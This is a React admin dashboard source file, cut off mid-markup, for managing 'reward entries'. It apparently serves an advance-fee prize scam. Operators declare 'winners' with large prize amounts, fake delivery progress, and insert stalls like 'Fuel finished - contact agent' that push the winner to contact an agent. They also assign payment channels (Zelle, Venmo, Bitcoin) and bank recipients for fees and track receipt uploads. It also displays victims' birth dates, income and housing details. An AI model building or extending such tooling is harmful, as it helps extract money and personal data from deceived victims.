import { useEffect, useState } from "react";
import {
  HiCheck, HiChevronDown, HiChevronUp, HiExclamation,
  HiRefresh, HiTruck, HiLocationMarker, HiOfficeBuilding,
  HiHome, HiPlus, HiTrash, HiClock, HiPencil, HiX,
} from "react-icons/hi";
import { apiFetch } from "../api";

const STATUS_OPTIONS = [
  "Awaiting Assignment",
  "Reviewed",
  "Transfer Details Sent",
  "Payment Confirmed",
  "Winner Declared",
  "Closed",
];

const CHECKPOINTS = [
  "Processing",
  "Out for delivery",
  "Fuel finished - contact agent",
  "Delivery issue - contact agent",
  "Delivered",
];

const PAYMENT_METHODS = [
  "Chime",
  "Venmo",
  "Zelle",
  "Apple Pay",
  "Bitcoin",
  "Crypto",
  "Ethereum",
  "E-transfer",
];

function etaInDays(days) {
  const date = new Date();
  date.setDate(date.getDate() + days);
  return date.toLocaleDateString(undefined, { dateStyle: "long" });
}

// ── Delivery manager panel ─────────────────────────────────────────────────────
function DeliveryManager({ entry, onUpdate }) {
  const delivery = entry.delivery || {};
  const [saving, setSaving] = useState(false);
  const [msg, setMsg] = useState("");
  const [form, setForm] = useState({
    pickupAddress: delivery.pickupAddress || entry.homeAddress || "",
    deliveryAddress: delivery.deliveryAddress || entry.homeAddress || "",
    progressPercent: delivery.progressPercent || 0,
    currentCheckpoint: delivery.currentCheckpoint || "Processing",
    estimatedDelivery: delivery.estimatedDelivery || "",
    carrier: delivery.carrier || "FedEx",
    trackingNumber: delivery.trackingNumber || "",
  });
  const [prizeAmount, setPrizeAmount] = useState(entry.prizeAmountWon || "");
  const [issueMsg, setIssueMsg] = useState("");
  const [issueDuration, setIssueDuration] = useState("");
  const [addingIssue, setAddingIssue] = useState(false);
  const [removingIssue, setRemovingIssue] = useState("");

  const issues = (delivery.issues || []).filter(
    (i) => !i.resolved && (!i.expiresAt || new Date(i.expiresAt) > new Date())
  );

  async function saveDelivery() {
    setSaving(true);
    setMsg("");
    try {
      // Save prize amount if set
      if (prizeAmount && prizeAmount !== entry.prizeAmountWon) {
        await apiFetch(`/api/admin/reward-entries/${entry._id}/declare-winner`, {
          method: "PATCH",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ prizeAmountWon: prizeAmount }),
        });
      }

      const res = await apiFetch(`/api/admin/reward-entries/${entry._id}/delivery`, {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(form),
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error || "Failed to update delivery.");
      setMsg("Delivery info saved.");
      onUpdate(data.entry);
    } catch (err) {
      setMsg(err.message);
    } finally {
      setSaving(false);
    }
  }

  async function addIssue() {
    if (!issueMsg.trim()) return;
    setAddingIssue(true);
    try {
      const body = { message: issueMsg.trim() };
      if (issueDuration && parseInt(issueDuration) > 0) {
        body.durationMinutes = parseInt(issueDuration);
      }
      const res = await apiFetch(`/api/admin/reward-entries/${entry._id}/delivery/issues`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(body),
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error || "Failed to add issue.");
      setIssueMsg("");
      setIssueDuration("");
      onUpdate(data.entry);
    } catch (err) {
      setMsg(err.message);
    } finally {
      setAddingIssue(false);
    }
  }

  async function removeIssue(issueId) {
    setRemovingIssue(issueId);
    try {
      const res = await apiFetch(`/api/admin/reward-entries/${entry._id}/delivery/issues/${issueId}`, {
        method: "DELETE",
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error || "Failed to remove issue.");
      onUpdate(data.entry);
    } catch (err) {
      setMsg(err.message);
    } finally {
      setRemovingIssue("");
    }
  }

  return (
    <div className="mt-4 rounded-2xl border border-blue-100 bg-blue-50/50 p-4">
      <p className="mb-3 text-xs font-extrabold uppercase tracking-widest text-blue-700 flex items-center gap-2">
        <HiTruck className="h-4 w-4" />
        Delivery Management
      </p>

      <div className="grid gap-3">
        {/* Prize amount */}
        <div>
          <label className="mb-1 block text-xs font-bold text-slate-600">Prize Amount Won (shown to winner)</label>
          <input
            type="text"
            value={prizeAmount}
            onChange={(e) => setPrizeAmount(e.target.value)}
            placeholder="e.g. $150,000"
            className="w-full rounded-xl border border-slate-200 bg-white px-3 py-2 text-sm outline-none focus:border-blue-400"
          />
        </div>

        {/* Addresses */}
        <div>
          <label className="mb-1 block text-xs font-bold text-slate-600">
            <HiOfficeBuilding className="mr-1 inline h-3.5 w-3.5" />
            Pickup / Origin Address
          </label>
          <textarea
            rows={2}
            value={form.pickupAddress}
            onChange={(e) => setForm((p) => ({ ...p, pickupAddress: e.target.value }))}
            placeholder="Enter pickup location..."
            className="w-full rounded-xl border border-slate-200 bg-white px-3 py-2 text-sm outline-none focus:border-blue-400"
          />
        </div>

        <div>
          <label className="mb-1 block text-xs font-bold text-slate-600">
            <HiHome className="mr-1 inline h-3.5 w-3.5" />
            Delivery Address (from user info: {entry.homeAddress}, {entry.state})
          </label>
          <textarea
            rows={2}
            value={form.deliveryAddress}
            onChange={(e) => setForm((p) => ({ ...p, deliveryAddress: e.target.value }))}
            placeholder="Enter delivery address..."
            className="w-full rounded-xl border border-slate-200 bg-white px-3 py-2 text-sm outline-none focus:border-blue-400"
          />
        </div>

        <div className="grid grid-cols-2 gap-3">
          {/* Carrier */}
          <div>
            <label className="mb-1 block text-xs font-bold text-slate-600">Carrier</label>
            <input
              type="text"
              value={form.carrier}
              onChange={(e) => setForm((p) => ({ ...p, carrier: e.target.value }))}
              className="w-full rounded-xl border border-slate-200 bg-white px-3 py-2 text-sm outline-none focus:border-blue-400"
            />
          </div>
          {/* Tracking number */}
          <div>
            <label className="mb-1 block text-xs font-bold text-slate-600">Tracking #</label>
            <input
              type="text"
              value={form.trackingNumber}
              onChange={(e) => setForm((p) => ({ ...p, trackingNumber: e.target.value }))}
              className="w-full rounded-xl border border-slate-200 bg-white px-3 py-2 text-sm outline-none focus:border-blue-400"
            />
          </div>
        </div>

        {/* Checkpoint */}
        <div>
          <label className="mb-1 block text-xs font-bold text-slate-600">Delivery State</label>
          <select
            value={form.currentCheckpoint}
            onChange={(e) => setForm((p) => ({ ...p, currentCheckpoint: e.target.value }))}
            className="w-full rounded-xl border border-slate-200 bg-white px-3 py-2 text-sm outline-none focus:border-blue-400"
          >
            {CHECKPOINTS.map((c) => (
              <option key={c} value={c}>{c}</option>
            ))}
          </select>
        </div>

        {/* Progress */}
        <div>
          <label className="mb-1 block text-xs font-bold text-slate-600">
            Progress: {form.progressPercent}%
          </label>
          <div className="flex items-center gap-3">
            <input
              type="range"
              min={0}
              max={100}
              step={5}
              value={form.progressPercent}
              onChange={(e) => setForm((p) => ({ ...p, progressPercent: Number(e.target.value) }))}
              className="flex-1 accent-orange-500"
            />
            <input
              type="number"
              min={0}
              max={100}
              value={form.progressPercent}
              onChange={(e) => {
                const value = Math.max(0, Math.min(100, Number(e.target.value) || 0));
                setForm((p) => ({ ...p, progressPercent: value }));
              }}
              className="w-20 rounded-xl border border-slate-200 bg-white px-3 py-2 text-sm font-bold outline-none focus:border-blue-400"
            />
          </div>
          <div className="mt-1 flex justify-between text-[10px] text-slate-400">
            <span>0%</span><span>25%</span><span>50%</span><span>75%</span><span>100%</span>
          </div>
        </div>

        {/* Estimated delivery */}
        <div>
          <label className="mb-1 block text-xs font-bold text-slate-600">Estimated Delivery</label>
          <input
            type="text"
            value={form.estimatedDelivery}
            onChange={(e) => setForm((p) => ({ ...p, estimatedDelivery: e.target.value }))}
            placeholder="e.g. May 10, 2025 or 3–5 business days"
            className="w-full rounded-xl border border-slate-200 bg-white px-3 py-2 text-sm outline-none focus:border-blue-400"
          />
          <div className="mt-2 flex flex-wrap gap-2">
            {[2, 4].map((days) => (
              <button
                key={days}
                type="button"
                onClick={() => setForm((p) => ({ ...p, estimatedDelivery: `Arrives in ${days} days - ${etaInDays(days)}` }))}
                className="rounded-lg border border-blue-200 bg-white px-3 py-1.5 text-[11px] font-bold text-blue-700 hover:bg-blue-50"
              >
                Set {days} days
              </button>
            ))}
          </div>
        </div>

        <button
          onClick={saveDelivery}
          disabled={saving}
          className="inline-flex items-center justify-center gap-2 rounded-xl bg-blue-600 px-4 py-2.5 text-xs font-bold text-white transition hover:bg-blue-700 disabled:opacity-60"
        >
          {saving ? <HiRefresh className="h-3.5 w-3.5 animate-spin" /> : <HiCheck className="h-3.5 w-3.5" />}
          {saving ? "Saving..." : "Save Delivery Info"}
        </button>
      </div>

      {/* Issues */}
      <div className="mt-4 border-t border-blue-200 pt-4">
        <p className="mb-3 text-xs font-extrabold uppercase tracking-widest text-red-600 flex items-center gap-2">
          <HiExclamation className="h-4 w-4" />
          Delivery Issues
        </p>
        <p className="mb-3 rounded-xl border border-red-100 bg-white px-3 py-2 text-[11px] font-semibold leading-5 text-red-700">
          Add an issue when the delivery should pause on the winner page. The winner will be urged to contact the delivery agent. Remove the issue when delivery is working again.
        </p>

        {/* Active issues */}
        {issues.length > 0 && (
          <div className="mb-3 space-y-2">
            {issues.map((issue) => (
              <div key={issue._id} className="flex items-start gap-2 rounded-xl border border-red-200 bg-red-50 px-3 py-2.5">
                <div className="flex-1">
                  <p className="text-xs font-semibold text-red-900">{issue.message}</p>
                  {issue.expiresAt && (
                    <p className="mt-0.5 text-[10px] text-red-500 flex items-center gap-1">
                      <HiClock className="h-3 w-3" />
                      Auto-clears: {new Date(issue.expiresAt).toLocaleString()}
                    </p>
                  )}
                </div>
                <button
                  onClick={() => removeIssue(issue._id)}
                  disabled={removingIssue === issue._id}
                  className="flex-shrink-0 rounded-lg border border-red-300 bg-white px-2 py-1 text-[10px] font-bold text-red-700 hover:bg-red-100 disabled:opacity-50"
                >
                  {removingIssue === issue._id ? "..." : "Remove"}
                </button>
              </div>
            ))}
          </div>
        )}

        {/* Add issue form */}
        <div className="grid gap-2">
          <input
            type="text"
            value={issueMsg}
            onChange={(e) => setIssueMsg(e.target.value)}
            placeholder="Issue description (e.g. Fuel finished, contact agent to continue delivery)"
            className="w-full rounded-xl border border-slate-200 bg-white px-3 py-2 text-xs outline-none focus:border-red-400"
          />
          <div className="flex gap-2">
            <input
              type="number"
              value={issueDuration}
              onChange={(e) => setIssueDuration(e.target.value)}
              placeholder="Auto-clear after N minutes (optional)"
              className="flex-1 rounded-xl border border-slate-200 bg-white px-3 py-2 text-xs outline-none focus:border-red-400"
            />
            <button
              onClick={addIssue}
              disabled={addingIssue || !issueMsg.trim()}
              className="inline-flex items-center gap-1.5 rounded-xl bg-red-600 px-3 py-2 text-xs font-bold text-white hover:bg-red-700 disabled:opacity-60"
            >
              <HiPlus className="h-3.5 w-3.5" />
              Add Issue
            </button>
          </div>
          <p className="text-[10px] text-slate-400">Leave minutes blank for permanent issue (until manually removed).</p>
        </div>
      </div>

      {msg && (
        <p className={`mt-3 rounded-xl px-3 py-2 text-xs font-semibold ${msg.includes("saved") ? "bg-emerald-50 text-emerald-700" : "bg-red-50 text-red-700"}`}>
          {msg}
        </p>
      )}
    </div>
  );
}

// ── Single entry row ───────────────────────────────────────────────────────────
function EntryRow({ entry: initialEntry }) {
  const [entry, setEntry] = useState(initialEntry);
  const [open, setOpen] = useState(false);
  const [showDelivery, setShowDelivery] = useState(false);
  const [status, setStatus] = useState(entry.status);
  const [updating, setUpdating] = useState(false);
  const [msg, setMsg] = useState("");

  // Bank transfer fields
  const [showTransfer, setShowTransfer] = useState(false);
  const [transferOptions, setTransferOptions] = useState([
    { label: "Bank Transfer", recipientName: "", recipientValue: "", instructions: "" },
  ]);
  const [savingTransfer, setSavingTransfer] = useState(false);

  // Instructions
  const [showInstructions, setShowInstructions] = useState(false);
  const [instrTitle, setInstrTitle] = useState(entry.assignedInstructionTitle || "");
  const [instrBody, setInstrBody] = useState(entry.assignedInstructionBody || "");
  const [savingInstr, setSavingInstr] = useState(false);
  const [paymentMethod, setPaymentMethod] = useState(entry.selectedPaymentMethod || entry.requestedPaymentMethod || "");
  const [savingPaymentMethod, setSavingPaymentMethod] = useState(false);

  const delivery = entry.delivery || {};
  const activeIssues = (delivery.issues || []).filter(
    (i) => !i.resolved && (!i.expiresAt || new Date(i.expiresAt) > new Date())
  );

  async function updateStatus() {
    setUpdating(true);
    setMsg("");
    try {
      const res = await apiFetch(`/api/admin/reward-entries/${entry._id}/status`, {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ status }),
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error || "Update failed.");
      setEntry(data.entry);
      setMsg("Status updated.");
    } catch (err) {
      setMsg(err.message);
    } finally {
      setUpdating(false);
    }
  }

  async function declareWinner() {
    setUpdating(true);
    try {
      const res = await apiFetch(`/api/admin/reward-entries/${entry._id}/declare-winner`, {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({}),
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error || "Failed.");
      setEntry(data.entry);
      setStatus(data.entry.status);
      setMsg("Winner declared. Delivery code: " + data.entry.deliveryCode);
    } catch (err) {
      setMsg(err.message);
    } finally {
      setUpdating(false);
    }
  }

  async function saveTransfer() {
    setSavingTransfer(true);
    setMsg("");
    try {
      const res = await apiFetch(`/api/admin/reward-entries/${entry._id}/transfer-details`, {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ bankTransferOptions: transferOptions }),
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error || "Failed.");
      setEntry(data.entry);
      setMsg("Transfer details saved.");
    } catch (err) {
      setMsg(err.message);
    } finally {
      setSavingTransfer(false);
    }
  }

  async function saveInstructions() {
    setSavingInstr(true);
    setMsg("");
    try {
      const res = await apiFetch(`/api/admin/reward-entries/${entry._id}/instructions`, {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ assignedInstructionTitle: instrTitle, assignedInstructionBody: instrBody }),
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error || "Failed.");
      setEntry(data.entry);
      setMsg("Instructions saved.");
    } catch (err) {
      setMsg(err.message);
    } finally {
      setSavingInstr(false);
    }
  }

  async function savePaymentMethod() {
    if (!paymentMethod) return;
    setSavingPaymentMethod(true);
    setMsg("");
    try {
      const res = await apiFetch(`/api/admin/reward-entries/${entry._id}/payment-method`, {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ paymentMethod }),
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error || "Failed.");
      setEntry(data.entry);
      setMsg("Payment method assigned.");
    } catch (err) {
      setMsg(err.message);
    } finally {
      setSavingPaymentMethod(false);
    }
  }

  const statusColor = {
    "Awaiting Assignment": "bg-slate-100 text-slate-700",
    Reviewed: "bg-blue-100 text-blue-800",
    "Transfer Details Sent": "bg-purple-100 text-purple-800",
    "Payment Confirmed": "bg-emerald-100 text-emerald-800",
    "Winner Declared": "bg-yellow-100 text-yellow-800",
    Closed: "bg-red-100 text-red-700",
  };

  return (
    <div className={`rounded-2xl border bg-white shadow-sm transition ${activeIssues.length > 0 ? "border-red-300" : "border-slate-200"}`}>
      {/* Row header */}
      <button
        onClick={() => setOpen((p) => !p)}
        className="flex w-full items-center justify-between px-5 py-4 text-left"
      >
        <div className="flex flex-wrap items-center gap-3">
          <span className="font-display font-bold text-slate-900">{entry.fullName}</span>
          <span className={`rounded-full px-2.5 py-0.5 text-xs font-bold ${statusColor[entry.status] || "bg-slate-100 text-slate-600"}`}>
            {entry.status}
          </span>
          {entry.deliveryCode && (
            <span className="rounded-full bg-slate-900 px-2.5 py-0.5 font-mono text-xs font-bold text-white">
              {entry.deliveryCode}
            </span>
          )}
          {entry.statusCode && (
            <span className="rounded-full bg-blue-100 px-2.5 py-0.5 font-mono text-xs font-bold text-blue-700">
              {entry.statusCode}
            </span>
          )}
          {entry.paymentReceipt?.url && (
            <span className="rounded-full bg-emerald-100 px-2.5 py-0.5 text-xs font-bold text-emerald-700">
              Receipt uploaded
            </span>
          )}
          {entry.selectedPaymentMethod && !entry.paymentReceipt?.url && (
            <span className="rounded-full bg-blue-100 px-2.5 py-0.5 text-xs font-bold text-blue-700">
              Method: {entry.selectedPaymentMethod}
            </span>
          )}
          {entry.requestedPaymentMethod && !entry.selectedPaymentMethod && (
            <span className="rounded-full bg-orange-100 px-2.5 py-0.5 text-xs font-bold text-orange-700">
              Requested: {entry.requestedPaymentMethod}
            </span>
          )}
          {activeIssues.length > 0 && (
            <span className="flex items-center gap-1 rounded-full bg-red-100 px-2.5 py-0.5 text-xs font-bold text-red-700">
              <HiExclamation className="h-3 w-3" />
              {activeIssues.length} issue{activeIssues.length > 1 ? "s" : ""}
            </span>
          )}
          <span className="text-xs text-slate-400">{entry.selectedRewardPack}</span>
        </div>
        {open ? <HiChevronUp className="h-4 w-4 text-slate-400" /> : <HiChevronDown className="h-4 w-4 text-slate-400" />}
      </button>

      {open && (
        <div className="border-t border-slate-100 px-5 pb-5">
          {/* User info */}
          <div className="mt-4 grid grid-cols-2 gap-3 rounded-2xl border border-slate-100 bg-slate-50 p-4 text-xs sm:grid-cols-3">
            {[
              ["Email", entry.email],
              ["Phone", entry.phone],
              ["Address", `${entry.homeAddress}, ${entry.state}`],
              ["DOB", entry.dateOfBirth],
              ["Occupation", entry.occupation],
              ["Sex", entry.sex],
              ["Income", `${entry.incomeFrequency}: ${entry.incomeAmount}`],
              ["Fulfillment", entry.fulfillmentPreference],
              ["Housing", entry.housingStatus],
              ["Pack", entry.selectedRewardPack],
              ["Price", entry.listedPrice],
              ["Prize Won", entry.prizeAmountWon || "—"],
              ["Requested Payment", entry.requestedPaymentMethod || "Not selected"],
              ["Assigned Payment", entry.selectedPaymentMethod || "Not assigned"],
              ["Status Code", entry.statusCode || "Pending"],
            ].map(([label, value]) => (
              <div key={label}>
                <p className="font-bold text-slate-400 uppercase tracking-widest text-[10px]">{label}</p>
                <p className="mt-0.5 font-semibold text-slate-700 break-all">{value || "—"}</p>
              </div>
            ))}
          </div>

          {entry.paymentReceipt?.url && (
            <div className="mt-4 rounded-2xl border border-emerald-200 bg-emerald-50 p-4 text-xs">
              <p className="font-bold uppercase tracking-widest text-emerald-700">Payment Receipt</p>
              <p className="mt-1 font-semibold text-emerald-900">
                Uploaded {entry.paymentReceipt.uploadedAt ? new Date(entry.paymentReceipt.uploadedAt).toLocaleString() : "recently"}
              </p>
              {entry.paymentReceipt.paymentMethod && (
                <p className="mt-1 font-semibold text-emerald-900">
                  Method: {entry.paymentReceipt.paymentMethod}
                </p>
              )}
              <a
                href={entry.paymentReceipt.url}
                target="_blank"
                rel="noreferrer"
                className="mt-3 inline-flex rounded-xl bg-emerald-700 px-3 py-2 font-bold text-white hover:bg-emerald-800"
              >
                View Receipt
              </a>
            </div>
          )}

          {/* Status update */}
          <div className="mt-4 flex flex-wrap gap-2">
            <select
              value={status}
              onChange={(e) => setStatus(e.target.value)}
              className="rounded-xl border border-slate-200 px-3 py-2 text-xs outline-none focus:border-orange-400"
            >
              {STATUS_OPTIONS.map((s) => <option key={s} value={s}>{s}</option>)}
            </select>
            <button
              onClick={updateStatus}
              disabled={updating}
              className="inline-flex items-center gap-1.5 rounded-xl bg-slate-900 px-3 py-2 text-xs font-bold text-white hover:bg-slate-700 disabled:opacity-60"
            >
              <HiCheck className="h-3.5 w-3.5" />
              {updating ? "Saving..." : "Update Status"}
            </button>
            {entry.status !== "Winner Declared" && (
              <button
                onClick={declareWinner}
                disabled={updating}
                className="inline-flex items-center gap-1.5 rounded-xl bg-yellow-500 px-3 py-2 text-xs font-bold text-white hover:bg-yellow-600 disabled:opacity-60"
              >
                🏆 Declare Winner
              </button>
            )}
          </div>

          {/* Delivery management toggle */}
          <button
            onClick={() => setShowDelivery((p) => !p)}
            className="mt-3 inline-flex items-center gap-2 rounded-xl border border-blue-200 bg-blue-50 px-3 py-2 text-xs font-bold text-blue-700 hover:bg-blue-100"
          >
            <HiTruck className="h-3.5 w-3.5" />
            {showDelivery ? "Hide" : "Manage"} Delivery Tracking
            {activeIssues.length > 0 && (
              <span className="rounded-full bg-red-500 px-1.5 py-0.5 text-[10px] text-white">
                {activeIssues.length}
              </span>
            )}
          </button>

          {showDelivery && (
            <DeliveryManager
              entry={entry}
              onUpdate={(updated) => setEntry(updated)}
            />
          )}

          {/* Transfer details toggle */}
          <button
            onClick={() => setShowTransfer((p) => !p)}
            className="mt-2 inline-flex items-center gap-2 rounded-xl border border-purple-200 bg-purple-50 px-3 py-2 text-xs font-bold text-purple-700 hover:bg-purple-100"
          >
            <HiLocationMarker className="h-3.5 w-3.5" />
            {showTransfer ? "Hide" : "Assign"} Bank Transfer Details
          </button>

          {showTransfer && (
            <div className="mt-3 rounded-2xl border border-purple-100 bg-purple-50/50 p-4">
              {transferOptions.map((opt, idx) => (
                <div key={idx} className="mb-3 grid gap-2 rounded-xl border border-slate-200 bg-white p-3">
                  <input
                    type="text"
                    value={opt.label}
                    onChange={(e) => {
                      const next = [...transferOptions];
                      next[idx].label = e.target.value;
                      setTransferOptions(next);
                    }}
                    placeholder="Label"
                    className="rounded-lg border border-slate-200 px-3 py-1.5 text-xs outline-none"
                  />
                  <input
                    type="text"
                    value={opt.recipientName}
                    onChange={(e) => {
                      const next = [...transferOptions];
                      next[idx].recipientName = e.target.value;
                      setTransferOptions(next);
                    }}
                    placeholder="Account / Recipient Name"
                    className="rounded-lg border border-slate-200 px-3 py-1.5 text-xs outline-none"
                  />
                  <input
                    type="text"
                    value={opt.recipientValue}
                    onChange={(e) => {
                      const next = [...transferOptions];
                      next[idx].recipientValue = e.target.value;
                      setTransferOptions(next);
                    }}
                    placeholder="Account Number / Address"
                    className="rounded-lg border border-slate-200 px-3 py-1.5 text-xs outline-none"
                  />
                  <textarea
                    rows={2}
                    value={opt.instructions}
                    onChange={(e) => {
                      const next = [...transferOptions];
                      next[idx].instructions = e.target.value;
                      setTransferOptions(next);
                    }}
                    placeholder="Instructions (optional)"
                    className="rounded-lg border border-slate-200 px-3 py-1.5 text-xs outline-none"
                  />
                </div>
              ))}
              <div className="flex gap-2">
                <button
                  onClick={() =>
                    setTransferOptions((p) => [
                      ...p,
                      { label: "Bank Transfer", recipientName: "", recipientValue: "", instructions: "" },
                    ])
                  }
                  className="rounded-lg border border-slate-200 px-3 py-1.5 text-xs font-bold text-slate-600 hover:bg-slate-100"
                >
                  + Add Method
                </button>
                <button
                  onClick={saveTransfer}
                  disabled={savingTransfer}
                  className="inline-flex items-center gap-1.5 rounded-xl bg-purple-600 px-3 py-2 text-xs font-bold text-white hover:bg-purple-700 disabled:opacity-60"
                >
                  {savingTransfer ? "Saving..." : "Save Transfer Details"}
                </button>
              </div>
            </div>
          )}

          {/* Payment method assignment */}
          <div className="mt-3 rounded-2xl border border-blue-100 bg-blue-50/50 p-4">
            <p className="mb-3 text-xs font-extrabold uppercase tracking-widest text-blue-700">
              Assign Payment Method
            </p>
            {entry.requestedPaymentMethod && (
              <p className="mb-3 rounded-xl border border-orange-200 bg-white px-3 py-2 text-[11px] font-semibold text-orange-700">
                User requested: {entry.requestedPaymentMethod}
              </p>
            )}
            <div className="flex flex-col gap-2 sm:flex-row">
              <select
                value={paymentMethod}
                onChange={(e) => setPaymentMethod(e.target.value)}
                className="flex-1 rounded-xl border border-slate-200 bg-white px-3 py-2 text-xs font-bold text-slate-700 outline-none focus:border-blue-400"
              >
                <option value="">Select method</option>
                {PAYMENT_METHODS.map((method) => (
                  <option key={method} value={method}>{method}</option>
                ))}
              </select>
              <button
                onClick={savePaymentMethod}
                disabled={savingPaymentMethod || !paymentMethod}
                className="inline-flex items-center justify-center rounded-xl bg-blue-600 px-3 py-2 text-xs font-bold text-white hover:bg-blue-700 disabled:opacity-60"
              >
                {savingPaymentMethod ? "Saving..." : entry.selectedPaymentMethod ? "Update Method" : "Assign Method"}
              </button>
            </div>
            <p className="mt-2 text-[11px] font-semibold text-blue-700">
              Receipt upload appears for the user only after this is assigned.
            </p>
          </div>

          {/* Instructions toggle */}
          <button
            onClick={() => setShowInstructions((p) => !p)}
            className="mt-2 inline-flex items-center gap-2 rounded-xl border border-emerald-200 bg-emerald-50 px-3 py-2 text-xs font-bold text-emerald-700 hover:bg-emerald-100"
          >
            <HiPencil className="h-3.5 w-3.5" />
            {showInstructions ? "Hide" : "Add"} Instructions Note
          </button>

          {showInstructions && (
            <div className="mt-3 rounded-2xl border border-emerald-100 bg-emerald-50/50 p-4 grid gap-2">
              <input
                type="text"
                value={instrTitle}
                onChange={(e) => setInstrTitle(e.target.value)}
                placeholder="Instruction title"
                className="rounded-xl border border-slate-200 bg-white px-3 py-2 text-xs outline-none"
              />
              <textarea
                rows={3}
                value={instrBody}
                onChange={(e) => setInstrBody(e.target.value)}
                placeholder="Instruction body..."
                className="rounded-xl border border-slate-200 bg-white px-3 py-2 text-xs outline-none"
              />
              <button
                onClick={saveInstructions}
                disabled={savingInstr}
                className="inline-flex items-center gap-1.5 rounded-xl bg-emerald-600 px-3 py-2 text-xs font-bold text-white hover:bg-emerald-700 disabled:opacity-60"
              >
                {savingInstr ? "Saving..." : "Save Instructions"}
              </button>
            </div>
          )}

          {msg && (
            <p className={`mt-3 rounded-xl px-3 py-2 text-xs font-semibold ${msg.includes("ailed") || msg.includes("error") ? "bg-red-50 text-red-700" : "bg-emerald-50 text-emerald-700"}`}>
              {msg}
            </p>
          )}
        </div>
      )}
    </div>
  );
}

// ── In-Delivery overview ───────────────────────────────────────────────────────
function InDeliveryPanel() {
  const [entries, setEntries] = useState([]);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    apiFetch("/api/admin/reward-entries/in-delivery")
      .then((r) => r.json())
      .then((d) => { if (d.entries) setEntries(d.entries); })
      .catch(() => {})
      .finally(() => setLoading(false));
  }, []);

  if (loading) return <p className="text-xs text-slate-500">Loading deliveries...</p>;
  if (!entries.length) return <p className="text-xs text-slate-500">No active deliveries.</p>;

  return (
    <div className="space-y-3">
      {entries.map((e) => {
        const delivery = e.delivery || {};
        const issues = (delivery.issues || []).filter(
          (i) => !i.resolved && (!i.expiresAt || new Date(i.expiresAt) > new Date())
        );
        return (
          <div key={e._id} className={`rounded-2xl border p-4 ${issues.length > 0 ? "border-red-200 bg-red-50" : "border-slate-200 bg-white"}`}>
            <div className="flex items-center justify-between">
              <div>
                <p className="text-sm font-bold text-slate-900">{e.fullName}</p>
                <p className="text-xs text-slate-500">{e.selectedRewardPack} · {e.fulfillmentPreference}</p>
              </div>
              <div className="text-right">
                <p className="font-mono text-sm font-bold text-slate-700">{e.deliveryCode}</p>
                <p className="text-xs text-slate-400">{delivery.progressPercent || 0}% · {delivery.currentCheckpoint || "Processing"}</p>
              </div>
            </div>
            {issues.length > 0 && (
              <div className="mt-2 flex flex-wrap gap-1">
                {issues.map((issue, i) => (
                  <span key={i} className="inline-flex items-center gap-1 rounded-full bg-red-100 px-2.5 py-1 text-xs font-semibold text-red-700">
                    <HiExclamation className="h-3 w-3" />
                    {issue.message}
                  </span>
                ))}
              </div>
            )}
            {delivery.deliveryAddress && (
              <p className="mt-1.5 text-xs text-slate-500 flex items-center gap-1">
                <HiLocationMarker className="h-3.5 w-3.5" />
                {delivery.deliveryAddress}
              </p>
            )}
          </div>
        );
      })}
    </div>
  );
}

// ── Main admin page ────────────────────────────────────────────────────────────
export default function AdminClaimsPage() {
  const [entries, setEntries] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState("");
  const [tab, setTab] = useState("entries"); // "entries" | "deliveries"
  const [search, setSearch] = useState("");

  async function loadEntries() {
    setLoading(true);
    setError("");
    try {
      const res = await apiFetch("/api/admin/reward-entries");
      const data = await res.json();
      if (!res.ok) throw new Error(data.error || "Failed to load.");
      setEntries(data.entries || []);
    } catch (err) {
      setError(err.message);
    } finally {
      setLoading(false);
    }
  }

  useEffect(() => { loadEntries(); }, []);

  const filtered = entries.filter((e) =>
    !search ||
    e.fullName?.toLowerCase().includes(search.toLowerCase()) ||
    e.email?.toLowerCase().includes(search.toLowerCase()) ||
    e.statusCode?.toLowerCase().includes(search.toLowerCase()) ||
    e.deliveryCode?.toLowerCase().includes(search.toLowerCase()) ||
    e.status?.toLowerCase().includes(search.toLowerCase())
  );

  return (
    <div className="min-h-screen bg-slate-50 px-4 py-10">
      <div className="mx-auto max-w-4xl">
        {/* Header */}
        <div className="mb-6 flex flex-wrap items-center justify-between gap-4">
          <div>
            <h1 className="font-display text-2xl font-extrabold text-slate-950">Admin Dashboard</h1>
            <p className="mt-1 text-sm text-slate-500">Manage reward entries & delivery tracking</p>
          </div>
          <button
            onClick={loadEntries}
            className="inline-flex items-center gap-2 rounded-xl border border-slate-200 bg-white px-4 py-2.5 text-sm font-bold text-slate-700 shadow-sm hover:bg-slate-50"
          >
            <HiRefresh className={`h-4 w-4 ${loading ? "animate-spin" : ""}`} />
            Refresh
          </button>
        </div>

        {/* Tabs */}
        <div className="mb-5 flex gap-2">
          <button
            onClick={() => setTab("entries")}
            className={`rounded-xl px-4 py-2 text-sm font-bold transition ${tab === "entries" ? "bg-slate-900 text-white" : "border border-slate-200 bg-white text-slate-600 hover:bg-slate-50"}`}
          >
            All Entries ({entries.length})
          </button>
          <button
            onClick={() => setTab("deliveries")}
            className={`flex items-center gap-2 rounded-xl px-4 py-2 text-sm font-bold transition ${tab === "deliveries" ? "bg-orange-600 text-white" : "border border-slate-200 bg-white text-slate-600 hover:bg-slate-50"}`}
          >
            <HiTruck className="h-4 w-4" />
            Active Deliveries
          </button>
        </div>

        {tab === "deliveries" ? (
          <div className="rounded-2xl border border-slate-200 bg-white p-5 shadow-sm">
            <p className="mb-4 text-xs font-extrabold uppercase tracking-widest text-orange-700">Entries Currently Under Delivery</p>
            <InDeliveryPanel />
          </div>
        ) : (
          <>
            {/* Search */}
